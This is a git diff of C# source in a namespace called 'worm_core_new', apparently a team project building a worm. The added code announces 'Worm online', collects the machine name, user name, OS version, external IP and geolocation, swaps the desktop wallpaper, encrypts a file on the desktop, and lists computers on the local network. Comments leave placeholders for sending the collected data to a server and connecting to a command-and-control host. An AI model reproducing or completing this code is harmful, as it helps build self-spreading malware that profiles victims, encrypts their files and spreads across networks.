@@ -27,30 +27,39 @@ namespace worm_core_new
 
         static void Main(string[] args)
         {
-            // Change desktop background
-            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, @"C:/Users/Matthew/Pictures/Drivers License.JPG", SPIF_UPDATEINIFILE);
 
-            //Encrypting file on desktop 
-            Encrypt("C:/Users/Matthew/Desktop/matthew.txt", "C:/Users/Matthew/Desktop/matthew-encrypted.txt");
-            Decrypt("C:/Users/Matthew/Desktop/matthew-encrypted.txt", "C:/Users/Matthew/Desktop/matthew-decrypted.txt");
+            Console.WriteLine("Worm online...\n");
     
             //Get system name, user logged in
             Console.WriteLine("MachineName: {0}", Environment.MachineName);
             Console.WriteLine("UserName: {0}", Environment.UserName);
             Console.WriteLine("OS version: {0}\n", Environment.OSVersion);
 
-            ////HTTP GET request for IP Address 
-            //WebClient client = new WebClient();
-            //string ipString = client.DownloadString("http://bot.whatismyipaddress.com/");
-            //Console.WriteLine("External IP address: {0}\n", ipString);
+            //HTTP GET request for IP Address 
+            WebClient client = new WebClient();
+            string ipString = client.DownloadString("http://bot.whatismyipaddress.com/");
+            Console.WriteLine("External IP address: {0}", ipString);
 
-            ////Location from keyboard layout or IP Address for another GET
-            //string location = client.DownloadString("http://ip-api.com/json/" + ipString);
-            //JObject json = JObject.Parse(location);
-            //Console.WriteLine("Location data:\n ");
-            //Console.WriteLine(json["city"] + ", " + json["regionName"] + " " + json["zip"] + " in the " + json["country"]);
-            //Console.WriteLine("ISP: " + json["isp"] + ", " + json["org"]);
-            //Console.WriteLine();
+            //Location from keyboard layout or IP Address for another GET
+            string location = client.DownloadString("http://ip-api.com/json/" + ipString);
+            JObject json = JObject.Parse(location);
+            Console.WriteLine(json["city"] + ", " + json["regionName"] + " " + json["zip"] + " in the " + json["country"]);
+            Console.WriteLine("ISP: " + json["isp"] + ", " + json["org"]);
+
+            // Change desktop background
+            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, @"C:/Users/Matthew/Pictures/Drivers License.JPG", SPIF_UPDATEINIFILE);
+            Console.WriteLine("\nChanged desktop background");
+
+            //Encrypting file on desktop 
+            Encrypt("C:/Users/Matthew/Desktop/matthew.txt", "C:/Users/Matthew/Desktop/matthew-encrypted.txt");
+            Decrypt("C:/Users/Matthew/Desktop/matthew-encrypted.txt", "C:/Users/Matthew/Desktop/matthew-decrypted.txt");
+
+            // Call kade's function or work with kade to send everything to server
+
+
+            // MICAELA HERE - OPEN SOCKET TO SERVER - connect to c2
+            
+
 
             // List all computers on local network
             DirectoryEntry root = new DirectoryEntry("WinNT:");
@@ -95,7 +104,7 @@ namespace worm_core_new
                 }
             }
 
-            // Call kade's function or work with kade to send everything to server
+
 
         }
         private static int[] Ports = new int[]
